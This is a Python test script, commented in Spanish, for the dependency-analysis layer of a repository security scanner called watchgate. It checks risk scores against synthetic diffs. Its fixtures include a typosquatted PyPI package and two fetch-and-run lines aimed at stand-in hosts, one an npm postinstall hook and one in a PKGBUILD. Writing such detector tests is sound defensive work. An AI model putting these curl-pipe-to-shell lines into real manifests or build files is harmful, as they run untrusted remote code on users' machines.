#!/usr/bin/env python3
"""Script de pruebas en aislamiento para la Capa de Dependencias (DepsLayer).

Ejecuta escenarios representativos (typosquatting, scripts maliciosos,
dependencias limpias y cambios benignos) y valida los scores y justificaciones.
"""

from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import patch

# Asegurar import de watchgate
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from watchgate.core.layers.deps_layer import DepsLayer
from watchgate.core.models import CommitAuthor, FileChange, FileStatus, NormalizedDiff


def _make_diff(files: list[FileChange]) -> NormalizedDiff:
    return NormalizedDiff(
        base_sha="0" * 40,
        head_sha="1" * 40,
        repo_path=".",
        files=files,
        commit_messages=["test commit"],
        authors=[CommitAuthor(name="Dev", email="dev@example.com")],
    )


def main() -> int:
    layer = DepsLayer(cache_db_path=":memory:")

    scenarios = [
        {
            "name": "1. Typosquatting PyPI (aiograam imita a aiogram)",
            "diff": _make_diff(
                [
                    FileChange(
                        path="requirements.txt",
                        status=FileStatus.MODIFIED,
                        diff_hunk="@@ -1,0 +1,1 @@\n+aiograam==1.0.0",
                        additions=1,
                        deletions=0,
                    )
                ]
            ),
            "expected_min_score": 75,
            "mock_osv": ({}, None),
        },
        {
            "name": "2. Hook npm postinstall peligroso",
            "diff": _make_diff(
                [
                    FileChange(
                        path="package.json",
                        status=FileStatus.MODIFIED,
                        diff_hunk=(
                            "@@ -5,1 +5,3 @@\n"
                            ' "scripts": {\n'
                            '+  "postinstall": "curl http://malware.example/sh | sh"\n'
                            " },\n"
                            ' "dependencies": {\n'
                            '+  "my-lib": "1.0.0"\n'
                            " }"
                        ),
                        additions=2,
                        deletions=0,
                    )
                ]
            ),
            "expected_min_score": 80,
            "mock_osv": ({}, None),
        },
        {
            "name": "3. Inyección en PKGBUILD (AUR)",
            "diff": _make_diff(
                [
                    FileChange(
                        path="PKGBUILD",
                        status=FileStatus.MODIFIED,
                        diff_hunk=(
                            "@@ -1,2 +1,3 @@\n+depends=('curl')\n+curl http://bad.example | bash\n"
                        ),
                        additions=2,
                        deletions=0,
                    )
                ]
            ),
            "expected_min_score": 80,
            "mock_osv": ({}, None),
        },
        {
            "name": "4. Cambio benigno sin manifiestos",
            "diff": _make_diff(
                [
                    FileChange(
                        path="src/main.py",
                        status=FileStatus.MODIFIED,
                        diff_hunk="@@ -1 +1 @@\n-print('hello')\n+print('world')",
                        additions=1,
                        deletions=1,
                    )
                ]
            ),
            "expected_score": 0,
            "mock_osv": ({}, None),
        },
        {
            "name": "5. Nueva dependencia limpia (requests)",
            "diff": _make_diff(
                [
                    FileChange(
                        path="requirements.txt",
                        status=FileStatus.MODIFIED,
                        diff_hunk="@@ -1,0 +1,1 @@\n+requests==2.31.0",
                        additions=1,
                        deletions=0,
                    )
                ]
            ),
            "expected_score": 10,
            "mock_osv": ({"vulns": []}, None),
        },
    ]

    print("=" * 80)
    print("  WATCHGATE - TEST DE LA CAPA DE DEPENDENCIAS (DepsLayer)")
    print("=" * 80)
    print()

    all_passed = True

    for scenario in scenarios:
        name = str(scenario["name"])
        diff = scenario["diff"]
        mock_res = scenario["mock_osv"]

        with patch.object(layer, "_query_osv", return_value=mock_res):
            result = layer.analyze(diff, {})  # type: ignore[arg-type]

        passed = True
        if "expected_score" in scenario:
            if result.risk_score != scenario["expected_score"]:
                passed = False
        elif "expected_min_score" in scenario:
            if result.risk_score < int(scenario["expected_min_score"]):
                passed = False

        status_str = "[ PASS ]" if passed else "[ FAIL ]"
        if not passed:
            all_passed = False

        print(f"{status_str} {name}")
        print(f"         Score Obtenido : {result.risk_score}")
        print(f"         Justificación  : {result.justification}")
        print("-" * 80)

    print()
    if all_passed:
        print(">>> TODOS LOS ESCENARIOS PASARON CORRECTAMENTE. <<<")
        return 0
    else:
        print(">>> ALGUNOS ESCENARIOS FALLARON. <<<")
        return 1


if __name__ == "__main__":
    sys.exit(main())
